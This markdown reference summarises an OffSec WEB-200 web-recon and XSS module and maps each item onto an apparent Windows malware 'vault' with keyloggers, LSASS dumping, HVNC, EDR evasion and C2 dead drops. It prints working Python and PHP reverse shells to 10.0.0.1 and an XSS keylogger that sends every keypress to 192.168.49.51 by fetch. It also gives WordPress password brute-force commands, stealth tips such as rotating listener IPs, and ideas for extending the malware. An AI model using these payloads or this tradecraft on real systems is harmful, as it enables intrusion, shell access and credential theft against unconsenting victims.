---
id: RTO-oswa-web-recon-xss-basics
name: OSWA WEB-200 — Web Recon, Tooling & XSS Foundations
source: Red Team Ops / OffSec WEB-200 (OSWA)
category: c2-infrastructure
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-022, T-023, T-019]
tags: [web-app-pentest, recon, burp-suite, nmap-nse, wfuzz, gobuster, hakrawler, wordlists, xss, javascript, keylogger-exfil, fetch-api, reverse-shell]
---

# OSWA WEB-200 — Web Recon, Tooling & XSS Foundations — Training Reference

## TL;DR
This module is the introductory track of OffSec's WEB-200 (OSWA) course: VPN lab setup, core web assessment tools (Burp Suite, Nmap NSE, Gobuster, Wfuzz, Hakrawler, SecLists, Cewl), reverse shell payload tradecraft, and an introduction to JavaScript/DOM/XSS with a focus on keylogger exfiltration via the Fetch API. From a vault operator perspective, most content is *web-app pentest fundamentals* rather than red-team operator tradecraft — but the keylogger-exfil pattern and HTTP-listener tradecraft map cleanly onto T-023's keylogger/browser-hook client capabilities and T-019's HTTP-poll dead-drop mechanics.

## Key Concepts

1. **CIA Triad & Least Privilege** — Confidentiality / Integrity / Availability framing; least privilege, defense in depth, and open security (Kerckhoffs) are introduced as the conceptual lens for assessment scoping. No vault cross-reference; this is foundational theory.

2. **Burp Suite as assessment core** — Intercept + HTTP History (passive capture), Repeater (single-request manipulation), Intruder (payload-position brute force with `§` markers), Decoder, Inspector (URL/encoded payload decoding). The "Send to Repeater" / "Send to Intruder" workflow is the canonical web-assessment loop. Vault overlap: none directly — the vault is Windows-native malware — but the malleable HTTP manipulation mindset underpins T-019 Edo Dead Drop and T-022 HTTP-poll transport design.

3. **Nmap NSE scripting** — Lua scripts under `/usr/share/nmap/scripts`, invoked via `--script=<name>` and customized with `--script-args`. Operator-relevant scripts: `http-enum`, `http-methods` (with `http-methods.url-path=`), `http-wordpress-enum`, `http-ls`, `http-robots.txt`, `http-cookie-flags`, `http-cors`. The `-sV` flag does banner grabbing; `-p<port>` scopes the scan. Vault overlap: T-023 `byakugan.rs` network recon (ARP, TCP, AD enum) is the offensive-side analogue; NSE is more general-purpose discovery.

4. **SecLists as the operator's wordlist corpus** — `/usr/share/seclists/` with subdirs: `Discovery/`, `Fuzzing/`, `Passwords/`, `Usernames/`, `Payloads/`, `Web-Shells/`, `Miscellaneous/`, `IOCs/`, `Pattern-Matching/`. Critical lists referenced by name: `Discovery/Web-Content/raft-medium-files.txt`, `raft-medium-directories.txt`, `Discovery/Web-Content/burp-parameter-names.txt` (2,588 params), `Passwords/xato-net-10-million-passwords-100000.txt`, `Usernames/cirt-default-usernames.txt`, `Discovery/DNS/subdomains-top1million-110000.txt`. Also `/usr/share/wordlists/rockyou.txt` and `/usr/share/wordlists/dirb/common.txt`. Vault overlap: none (vault uses compiled-in payload constants), but the methodology informs payload corpus design.

5. **Cewl for custom wordlist generation** — Spiders a target URL to depth `-d`, minimum word length `-m`, writes output with `-w`. Useful for org-targeted password/content discovery (employee names, project codenames, abbreviations). Vault analogue: T-023 recon/exfil; Cewl output is pre-engagement OSINT for wordlist-driven attacks.

6. **Gobuster dir/dns/vhost modes** — `dir` for content, `dns` for subdomain busting, `vhost` for virtual hosts. Flags: `-u` URL, `-w` wordlist, `-t` threads, `-b` blocklist status codes (e.g. `-b 301` to suppress redirects), `-o` output, `-q` quiet. DNS mode uses `-d <domain>`. Vault analogue: passive recon state in T-023 `byakugan.rs`.

7. **Wfuzz payload substitution** — `FUZZ`, `FUZ2Z`, `FUZ3Z` markers in URL/POST data/headers; `-z file,<path>` payload source; `--hc`/`--hh`/`--hl`/`--hw` to filter by response code/chars/lines/words. POST fuzzing via `-d "log=admin&pwd=FUZZ"`. Authenticated fuzzing via `-b "cookie=value"`. Vault analogue: HTTP poll transport (T-019) uses similar request templating.

8. **Hakrawler + Wayback Machine** — Spidering tool that pulls archived endpoints from archive.org, returning old subdomains / dead paths without generating active traffic against the live target. Unique tradecraft: combines crawl + Wayback archive scraping. `-d <depth>`, `-t <threads>`, `-insecure` for TLS. Vault analogue: T-019 dead-drop discovery (rentry.co + Sepolia contract) uses a similar "don't directly hammer the target" pattern.

9. **Reverse shell payload selection by web tech** — PHP functions (`exec`, `system`, `passthru`, `shell_exec`, `popen`, `fsockopen`), Python one-liner (`socket`+`subprocess`+`os`+`pty.spawn("/bin/bash")`), all targeting `nc -lvp 80` listener. Operator must identify web stack (file extensions, install/readme/license files, source comments, copyright dates) before payload selection. Vault analogue: T-022 dark_crystal `winhttp_dl.rs` staged download — same "match payload to runtime" tradecraft but Windows side.

10. **XSS sandbox tradecraft** — Split-screen "hacker browser" / "victim simulator" with toggleable behaviors: HttpOnly cookie, non-HttpOnly cookie, blind credential entry, stored-password auto-fill, simulated keystrokes, Local Storage secrets. `/reset` endpoint to clean contaminated DBs. Vault analogue: T-023 `browser_hook.rs` (MV3 extension sideloading) and `html_overlay.rs` (WebView2 phishing overlay) cover the post-exploitation side of "what you can do once JS runs in the victim browser."

11. **DOM, Window, Document, Fetch APIs** — JavaScript fundamentals for XSS exploitation: `document.getElementsByTagName("input")` to harvest form values, `document.addEventListener("keydown", fn)` for keylogging, `fetch("http://attacker/k?key="+event.key)` for non-blocking exfil. SOP restricts *reading* cross-origin responses but **does not prevent the request being sent** — this is the entire basis for XSS data exfil. Vault analogue: T-023 `keylogger.rs` (native WH_*LL hooks) is the OS-level equivalent; T-023 `browser_hook.rs` is the in-browser equivalent.

## Operational Techniques

### Environment Variable Hygiene for Targeting
- **What**: Pre-export `$IP` and `$URL` vars so subsequent commands are reusable and auditable.
- **When to use**: Every engagement; first commands after VPN connect.
- **How**:
  ```
  export IP="172.16.80.1"
  export URL="http://offsecwp:80/"
  ```
- **Vault link**: None directly; mirrors the operator pattern of build-time/runtime config embedding in T-021 `selection_config.rs` (`include_str!` YAML → OnceLock).
- **Tool/code**: `export`, `echo $VAR`.
- **OPSEC**: Variable values persist in shell history; clear or `unset` after engagement.

### /etc/hosts Mapping for Engagement Targets
- **What**: Map friendly hostnames (`offsecwp`, `execsandbox`, `xss-sandbox`, `shopizer`) to lab IPs.
- **When to use**: Engagement kickoff; required before Burp/Nmap/Gobuster use the friendly name.
- **How**: Edit `/etc/hosts` directly or via `sudo mousepad /etc/hosts`. Verify with `cat /etc/hosts` and `http://offsecwp` in Firefox.
- **Vault link**: None.
- **Tool/code**: `mousepad`, `cat`.
- **OPSEC**: None; lab-only. Don't carry over to live engagements where DNS poisoning is monitored.

### OpenVPN Lab Connection
- **What**: Connect to engagement VPN from Kali VM.
- **When to use**: Start of every lab/exam session.
- **How**:
  ```
  sudo updatedb
  locate universal.ovpn
  cd /home/kali/offsec
  sudo openvpn universal.ovpn
  ```
  Leave terminal open. Disconnect with `C+c`.
- **Vault link**: None directly; T-022 has its own transport layer (TCP/HTTP-poll/WebSocket) but no OpenVPN-specific guidance.
- **Tool/code**: `openvpn`, `updatedb`, `locate`.
- **OPSEC**: "Treat labs as hostile environment" — change default Kali passwords/keys, stop unneeded services, no student-to-student VPN traffic.

### Burp Suite Capture + Repeater Loop
- **What**: Intercept HTTP traffic, forward selectively, replay with modifications.
- **When to use**: Every web assessment — primary discovery/validation tool.
- **How**:
  1. Burp Suite → Proxy tab → "Open Browser" (Chromium-based built-in).
  2. Toggle Intercept on/off. Intercept **on** = capture and forward each request; **off** = still log to HTTP History.
  3. Right-click any history/intercept entry → "Send to Repeater" (C+B+r) or "Send to Intruder" (C+B+i).
  4. In Repeater: modify Request panel → Send → review Response panel.
  5. Decode with `C+B+u` or via Decoder tab or Inspector panel.
  6. Match-and-Replace rules in Proxy > Options allow User-Agent spoofing (IE/Chrome/Firefox/mobile).
- **Vault link**: None — Burp is web-side; vault's T-022 malleable C2 (`henge.rs`) is the operator-side analog of "control request/response shape."
- **Tool/code**: Burp Suite Community Edition. Note: Intruder is **throttled** in CE.
- **OPSEC**: Intruder brute force is noisy and rate-limited; prefer Wfuzz for bulk fuzzing. Burp's default self-signed CA must be installed in browser trust store for HTTPS interception.

### Burp Intruder Payload Positioning
- **What**: Mark spots in HTTP request where wordlist values will be substituted.
- **When to use**: Targeted brute force of single parameter (login, token, ID).
- **How**:
  1. Intercept request → "Send to Intruder".
  2. Positions tab → `Clear §` to remove auto-marked fields.
  3. Highlight target value → `Add §` to wrap with `§value§`.
  4. Payloads tab → "Load..." wordlist.
  5. Start Attack. Sort response column by **Length** to spot anomalies (successful logins usually differ in size).
- **Vault link**: None.
- **Tool/code**: Burp Intruder, `wordlist-test.txt` (custom small list).
- **OPSEC**: Throttled in CE; concurrent logins may trigger account lockout / WAF.

### Nmap HTTP NSE Scan
- **What**: Run HTTP-specific Lua scripts against target port.
- **When to use**: Initial service enumeration; identifying web stack & exposed paths.
- **How**:
  ```
  sudo nmap -p80 -sV $IP
  nmap -p80 --script=http-enum $IP
  nmap -p80 --script=http-methods --script-args http-methods.url-path='/wp-includes/' $IP
  nmap -p80 -sV --script http-wordpress-enum offsecwp
  nmap -p80 --script=http-methods,http-ls,http-robots.txt,http-cookie-flags,http-cors $IP
  ```
  Scripts live in `/usr/share/nmap/scripts` (filter with `ls | grep -i http`).
- **Vault link**: T-023 `byakugan.rs` recon module does TCP-level enumeration; NSE is the network-side discovery complement.
- **Tool/code**: `nmap`, NSE scripts.
- **OPSEC**: NSE has safe vs. intrusive categories — `http-brute` is intrusive (may lock accounts). `-sV` banner grab discloses your scanner UA unless customized.

### Gobuster Directory / Subdomain Enumeration
- **What**: Wordlist-driven directory, file, DNS subdomain, vhost discovery.
- **When to use**: Content discovery when no sitemap; subdomain expansion of scoped domain.
- **How**:
  ```
  gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301
  gobuster dns -d megacorpone.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
  ```
  Modes: `dir`, `dns`, `fuzz`, `s3`, `vhost`.
- **Vault link**: None.
- **Tool/code**: `gobuster`.
- **OPSEC**: High traffic volume = noisy. `-b 301` to filter redirects. **Subdomain busting requires explicit scope authorization** — confirm with stakeholders first.

### Wfuzz File / Directory / Parameter / POST Fuzzing
- **What**: Substitution-based fuzzing of any HTTP request position.
- **When to use**: When Gobuster hits a wall; for parameter discovery and POST-data brute force.
- **How**:
  ```
  # File discovery (no trailing slash)
  export URL="http://offsecwp:80/FUZZ"
  wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 "$URL"

  # Directory discovery (trailing slash)
  export URL="http://offsecwp:80/FUZZ/"
  wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403,301 "$URL"

  # Hidden parameter discovery
  export URL="http://offsecwp:80/index.php?FUZZ=data"
  wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "$URL"

  # Single-param value fuzz (filter on response length to spot anomalies)
  wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404,301 http://offsecwp:80/index.php?fpv=FUZZ

  # POST-data brute force
  wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 --hh 7201 -d "log=admin&pwd=FUZZ" http://offsecwp:80/wp-login.php

  # Authenticated fuzzing
  wfuzz -c -z file,<list> -b "wordpress_logged_in_XXX=YYY" "$URL"
  ```
  Multi-param: use `FUZ2Z`, `FUZ3Z` markers. Filter flags: `--hc` (codes), `--hh` (chars), `--hl` (lines), `--hw` (words).
- **Vault link**: T-019 Edo Dead Drop uses rentry.co + Sepolia contract as the discovery channel; Wfuzz tradecraft informs how the operator would brute force or fuzz the C2 endpoints themselves.
- **Tool/code**: `wfuzz`, SecLists.
- **OPSEC**: `--hc 301,404` to suppress noise; `--hh <size>` to suppress baseline response (e.g. 7201 byte failed-login page). 100k-request run = very noisy — pace and rotate User-Agent if needed.

### Cewl Custom Wordlist Generation
- **What**: Spider a target site and extract unique words ≥N chars to a wordlist.
- **When to use**: Org-specific brute force / password guessing (employee names, project names, jargon).
- **How**:
  ```
  sudo cewl -d 2 -m 5 -w ourWordlist.txt www.MegaCorpOne.com
  ```
  Flags: `-d` depth, `-m` min word length, `-w` output file, `-e` include emails, `-a` include metadata, `--with-numbers`, `--lowercase`, `--convert-umlauts`. Supports `--auth_type`, `--auth_user`, `--auth_pass`, `--proxy_*`, `-H` custom headers.
- **Vault link**: T-023 `byakugan.rs` recon — same OSINT-then-target philosophy, different platform.
- **Tool/code**: `cewl`.
- **OPSEC**: Passive against target (just crawling); wordlist output is engagement-specific sensitive data — store encrypted, shred post-engagement.

### Custom Binaries Wordlist (Code-Execution Side)
- **What**: Generate a wordlist of binaries present on attacker machine (`/usr/bin`) for target enumeration via web RCE.
- **When to use**: Have web RCE, want to enumerate which Linux binaries exist on target.
- **How**:
  ```
  ls -sa /usr/bin | sed 's/[0-9]*//g' | sed -r 's/\s+//g' | sort -u > $HOME/binaries-wordlist.txt
  ```
  Then iterate via Wfuzz or simple `which` loop against the RCE endpoint.
- **Vault link**: T-023 `sysinfo_collect.rs` enumerates Windows binaries; this is the Linux-side equivalent.
- **Tool/code**: `ls`, `sed`, `sort`, shell pipe.
- **OPSEC**: Each RCE probe is a log entry; space probes, use POST not GET where possible.

### Hakrawler + Wayback Recon
- **What**: Crawl current site + scrape archive.org for historical endpoints.
- **When to use**: Pre-engagement OSINT; discovering abandoned dev paths / old subdomains without touching live target.
- **How**:
  ```
  echo "https://www.megacorpone.com/" > urls.txt
  cat urls.txt | ./hakrawler
  ```
  Flags: `-d <depth>` (default 2), `-t <threads>` (default 8), `-insecure` (disable TLS verify).
- **Vault link**: T-019 discovery (rentry.co + Sepolia) — same "pull from a non-target archive" pattern, different channel.
- **Tool/code**: `hakrawler`.
- **OPSEC**: Best for pre-engagement — zero direct target traffic. Confirm scope of any discovered subdomains before active testing.

### Reverse Shell Listener + Payload Delivery
- **What**: Set up Netcat listener; deliver web-tech-matched reverse shell payload.
- **When to use**: After achieving web RCE; pivot to interactive shell.
- **How**:
  Listener:
  ```
  nc -lvp 80
  ```
  Python one-liner:
  ```
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
  ```
  PHP variants (pick based on which functions are un-disabled):
  ```
  php -r '$sock=fsockopen("10.0.0.1",80);exec("/bin/sh -i <&3 >&3 2>&3");'
  php -r '$sock=fsockopen("10.0.0.1",80);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
  php -r '$sock=fsockopen("10.0.0.1",80);system("/bin/sh -i <&3 >&3 2>&3");'
  php -r '$sock=fsockopen("10.0.0.1",80);passthru("/bin/sh -i <&3 >&3 2>&3");'
  php -r '$sock=fsockopen("10.0.0.1",80);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
  ```
  Verify TTY post-shell with `tty` (expect `/dev/pts/0`-style output).
- **Vault link**: T-022 `winhttp_dl.rs` staged download is the Windows-side staged payload acquisition pattern; same "match payload to runtime capability" tradecraft. Reference: Payload All The Things for additional shell payloads.
- **Tool/code**: `nc`, `python`, `php`, `bash` aliases like `revshells` → `cat` of saved payload file.
- **OPSEC**: URL-encode payloads before delivery; account for bad characters (null bytes, quotes). Save payloads locally for time-sensitive scenarios. Establish listener before triggering payload.

### XSS DOM Keylogger Exfiltration
- **What**: Inject JS that captures all victim keypresses and exfils via Fetch to attacker HTTP listener.
- **When to use**: Stored/reflected/DOM XSS with victim who types sensitive data (creds, messages) into the page.
- **How**:
  Attacker listener (logs URL path of each request):
  ```
  python3 -m http.server 80
  ```
  Payload (injected via XSS vector):
  ```javascript
  function logKey(event){
    fetch("http://192.168.49.51/k?key=" + event.key);
  }
  document.addEventListener('keydown', logKey);
  ```
  Each keypress produces an HTTP GET like:
  ```
  172.16.121.101 - - "GET /k?key=I HTTP/1.1" 404 -
  ```
  SOP prevents *reading* the cross-origin response, but the request itself is sent — sufficient for exfil.
- **Vault link**: T-023 `keylogger.rs` uses native `WH_KEYBOARD_LL` hooks at the OS level — broader capture but requires code execution on host. The XSS variant captures only what's typed in the victim's browser tab, no host compromise needed. T-023 `browser_hook.rs` (MV3 sideload) is the persistence layer that can deliver such a payload. T-019 HTTP-poll transport (`http_poll_transport.rs`) is the inverse direction (client polls C2); here the browser pushes to the listener.
- **Tool/code**: `python3 -m http.server 80`, Fetch API, `document.addEventListener`, `event.key`.
- **OPSEC**: 404 responses in Python http.server logs are expected — victim sees failed-load in DevTools network panel. Consider `no-cors` mode (default for simple GET). For stealth, batch keys with setTimeout and POST JSON; for resilience, rotate listener IP. Detect: victim browser network tab.

### XSS Sandbox Workflow
- **What**: Self-contained "hacker browser" + "victim simulator" split-screen for safe XSS PoC development.
- **When to use**: Building payloads before live engagement; demonstrating XSS impact to clients.
- **How**:
  - Edit `/etc/hosts` to map `xss-sandbox` (192.168.121.101) and `shopizer` (192.168.121.102).
  - Browse `http://xss-sandbox` → pick app: `Info`, `Eval`, `Search`, `Blog`, `Survey`, `Donate`, `RSVP`, `List`, `ToDo`.
  - Configure victim behavior (top-right panel): HttpOnly cookie / non-HttpOnly cookie / blind credential entry / stored password auto-fill / simulated keystrokes / data in Local Storage.
  - Click **Render** to execute the page in victim context. Screenshot returns to lower-right quadrant.
  - **Clear** to reconfigure. `/reset` endpoint cleans contaminated DBs on each vulnerable app.
- **Vault link**: T-023 `html_overlay.rs` (WebView2 phishing) and `browser_hook.rs` (MV3 extension) are the productionized versions of "what an attacker does once JS runs in a victim browser" — covering credential capture, UI manipulation, persistence.
- **Tool/code**: XSS Sandbox VM, Firefox Web Console (`C+B+k`), `about:blank` for clean JS testing (type `allow pasting` first to bypass anti-self-XSS).
- **OPSEC**: Sandbox-only; never deploy payloads untested. `/reset` between runs to avoid DB contamination breaking later exercises.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `sudo openvpn <file>.ovpn` | Connect to engagement VPN | Leave terminal open; `C+c` to disconnect; cache password in memory (use `--auth-nocache`) |
| `Burp Suite` (Proxy/Repeater/Intruder/Decoder/Inspector) | HTTP intercept, replay, brute force, decode | Intruder throttled in CE; install CA cert for HTTPS; match-replace for UA spoofing |
| `sudo nmap -p80 -sV $IP` | Service version banner grab on port 80 | Banner may be spoofed — verify |
| `nmap -p80 --script=http-enum $IP` | WordPress / common dir enum | Safe script category |
| `nmap -p80 --script=http-methods --script-args http-methods.url-path='/wp-includes/' $IP` | Identify allowed HTTP methods on URI | Look for `PUT` (upload potential) |
| `nmap -p80 -sV --script http-wordpress-enum offsecwp` | Enumerate WP plugins/themes | Top-100 limit by default |
| `gobuster dir -u $URL -w <list> -t 5 -b 301` | Directory/file enumeration | `-b 301` suppresses redirects |
| `gobuster dns -d <domain> -w <list> -t 30` | Subdomain discovery | Verify scope authorization first |
| `wfuzz -c -z file,<list> --hc 301,404,403 "$URL"` | File/directory/param fuzzing | `--hh <size>` to suppress baseline; `-d` for POST; `-b` for authed |
| `hakrawler -d 2 -t 8` | Spider + Wayback archive crawl | Pre-engagement OSINT; minimal live target traffic |
| `cewl -d 2 -m 5 -w out.txt <url>` | Custom wordlist from target content | Passive crawl; supports auth, proxy, headers |
| `ls -sa /usr/bin \| sed ... \| sort -u > list.txt` | Generate Linux binaries wordlist for RCE enumeration | Engagement-specific; shred post-engagement |
| `nc -lvp 80` | Netcat listener for reverse shells | Log file with `>> nc.log`; rotate port if WAF blocks 80 |
| `python -c 'import socket,subprocess,os;...'` | Python reverse shell to nc listener | URL-encode for HTTP delivery |
| `php -r '$sock=fsockopen(...);exec(...);'` | PHP reverse shell (5 variants) | Pick based on disabled functions (`disable_functions`) |
| `python3 -m http.server 80` | Simple HTTP listener for XSS exfil | Logs each request URL — parse for exfil data; 404s expected |
| `fetch("http://attacker/k?key="+event.key)` | JS exfil of keypresses via Fetch API | SOP blocks response read, not request send |
| `document.addEventListener('keydown', fn)` | JS keylogger hook | fn receives `event`, access `event.key` |
| Firefox Web Console (`C+B+k`) | Live JS testing in `about:blank` | Type `allow pasting` first |
| SecLists (`/usr/share/seclists/`) | Wordlist corpus | Categories: Discovery, Fuzzing, Passwords, Usernames, Payloads, Web-Shells, IOCs, Pattern-Matching, Miscellaneous |
| `/usr/share/wordlists/rockyou.txt` | Default password list | Combine with SecLists/Passwords for cracking |
| `/usr/share/wordlists/dirb/common.txt` | Small common-path wordlist | Quick Gobuster sanity checks |
| `/reset` (XSS Sandbox) | Reset contaminated sandbox DBs | Per-app endpoint; non-DB apps (Info) have none |

## Gaps & Extensions

**What the vault covers that this training doesn't:**
- **Windows-native tradecraft**: syscalls (T-001/T-002/T-003), process injection (T-007–T-015), EDR evasion (T-016), sleep obfuscation (T-005), persistence (T-017–T-019), anti-analysis (T-020), crypto/obfuscation (T-021). The OSWA course is purely web-app pentest and never touches Windows internals.
- **Production C2 infrastructure**: T-022 (SOCKS5, HVNC, malleable C2, peer relay, multi-chain vault) and T-019 (Edo Dead Drop via Google Translate, Ethereum TX, steganography) go far beyond the `python3 -m http.server 80` listener shown here.
- **Browser-hook persistence**: T-023 `browser_hook.rs` covers MV3 extension sideloading for long-term browser persistence; the OSWA XSS coverage ends at one-shot keylogger exfil.
- **OS-level keylogger**: T-023 `keylogger.rs` uses `WH_KEYBOARD_LL` hooks for system-wide capture regardless of which app has focus — XSS keylogger only captures keys typed in the vulnerable page.
- **Credential harvesting**: T-023 has LSASS dump (`lsass_dump.rs`), WiFi extraction (`extract_wifi.rs`), WMI exec — none of which OSWA covers.
- **Phishing overlays**: T-023 `html_overlay.rs` (WebView2 credential overlay) and `overlay.rs` (WDA_EXCLUDEFROMCAPTURE Win32 overlay) are productionized phishing — OSWA mentions XSS phishing conceptually but doesn't implement.
- **Anti-VM / anti-debug**: T-020 suite; OSWA's only nod to detection is "treat labs as hostile environment."

**What this training covers that the vault doesn't:**
- **Web app pentest methodology**: full Burp Suite workflow (Intercept/Repeater/Intruder/Decoder/Inspector/Match-and-Replace), Nmap NSE HTTP script inventory, Gobuster modes, Wfuzz multi-positional fuzzing with `FUZ2Z`/`FUZ3Z` markers. The vault's `byakugan.rs` does network recon but has no web-content discovery equivalent.
- **Wayback Machine as recon channel** (Hakrawler): a passive OSINT source the vault doesn't use. T-019's dead drops (rentry.co, Sepolia) are operator-controlled; Wayback is a public archive leveraged against arbitrary targets — could extend T-019's discovery phase.
- **SecLists corpus organization**: vault uses compile-time `include_str!` payload constants (T-021) — SecLists-style externalized corpora would let operators swap payloads without rebuild.
- **Cewl org-targeted wordlist generation**: vault has no OSINT-to-wordlist pipeline.
- **PHP/Python reverse shell one-liners and the 5-PHP-function fallback chain** (`exec`/`shell_exec`/`system`/`passthru`/`popen`): explicit Linux-side web-RCE-to-shell tradecraft; vault's `winhttp_dl.rs` is Windows-side staged download only.
- **XSS sandbox tradecraft** (split hacker/victim browser, behavior simulation, HttpOnly/LocalStorage/credential auto-fill toggle, `/reset` per-app DB wipe): a testing framework pattern the vault's diagnostic harness (T-020 `diag_mp_otp.rs` / `diagnostic.rs`) could borrow for browser-side PoC validation.
- **JavaScript DOM/Window/Document/Fetch API operator primer**: vault assumes Windows-native operators; this is the browser-side analog and useful for any operator doing client-side browser_hook work in T-023.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| Burp Suite HTTP manipulation | T-019 Edo Dead Drop / T-022 Malleable C2 | Conceptual — vault controls both ends of HTTP conversation; Burp manipulates one end |
| Nmap NSE HTTP scripts | T-023 `byakugan.rs` (network recon) | Complementary — NSE is network/service discovery; byakugan is post-foothold internal enum |
| SecLists wordlists | T-021 `selection_config.rs` (YAML config) | Methodological — vault uses compile-time constants; SecLists pattern suggests externalized payload corpus design |
| Cewl org-targeted wordlists | T-023 `byakugan.rs` (recon) / T-019 (discovery) | Complementary — pre-engagement OSINT for targeting |
| Gobuster dir/dns modes | T-023 `byakugan.rs` | Complementary — different platform, same recon goal |
| Wfuzz multi-position fuzzing | T-019 HTTP poll transport | Conceptual — both template HTTP requests with substitution markers |
| Hakrawler + Wayback | T-019 Edo Dead Drop (rentry.co + Sepolia) | Conceptual — both pull from non-target archives; different channels |
| `python3 -m http.server` exfil listener | T-019 HTTP poll / T-022 NT sockets | Operator pattern — vault has production transports; Python http.server is the minimal PoC equivalent |
| Fetch API keylogger exfil | T-023 `keylogger.rs` (`WH_KEYBOARD_LL`) | Equivalent at different layers — XSS=per-tab browser scope, no host compromise; native=system-wide, requires host code execution |
| Fetch API keylogger exfil | T-023 `browser_hook.rs` (MV3 extension) | Complementary — MV3 extension is the persistence/delivery layer for the JS payload |
| `document.addEventListener('keydown', fn)` | T-023 `input_blocker.rs` (`WH_KEYBOARD_LL`/`WH_MOUSE_LL`) | Equivalent at different layers — JS captures browser tab input; native hooks capture system-wide |
| DOM access (`getElementsByTagName('input')` for credential capture) | T-023 `html_overlay.rs` (WebView2 phishing overlay) | Complementary — XSS harvests via injected JS; html_overlay fakes the entire UI to harvest |
| Reverse shell via PHP/Python to `nc -lvp 80` | T-022 `winhttp_dl.rs` (staged download) | Conceptual — both pivot from initial access to interactive control; different OS, different transport |
| Custom binaries wordlist for RCE enumeration | T-023 `sysinfo_collect.rs` | Equivalent at different layers — Linux `/usr/bin` enumeration via web RCE vs Windows sysinfo collection |
| XSS sandbox (split hacker/victim browser, `/reset` per-app) | T-020 `diagnostic.rs` (marker-based verification harness) | Methodological — both are PoC-validation harnesses with reset semantics; vault could adopt sandbox pattern for browser-side tests |
| `/etc/hosts` mapping for engagement targets | T-021 `selection_config.rs` OnceLock config | Methodological — both pre-configure engagement context; vault does it at compile time |
| Environment variable hygiene (`export IP=`, `export URL=`) | T-021 `config.rs` runtime config + build-time `.env` embedding | Methodological — vault formalizes the pattern; OSWA shows operator-side discipline |
| Payload All The Things reference | T-021 `experimental/obfuscation/` (IPv4/IPv6/MAC/UUID/words shellcode encoders) | Complementary — Payload All The Things is web shell corpus; vault's obfuscation corpus is shellcode encoders |
| "Try Harder" / growth mindset | (none) | Cultural — no technical mapping |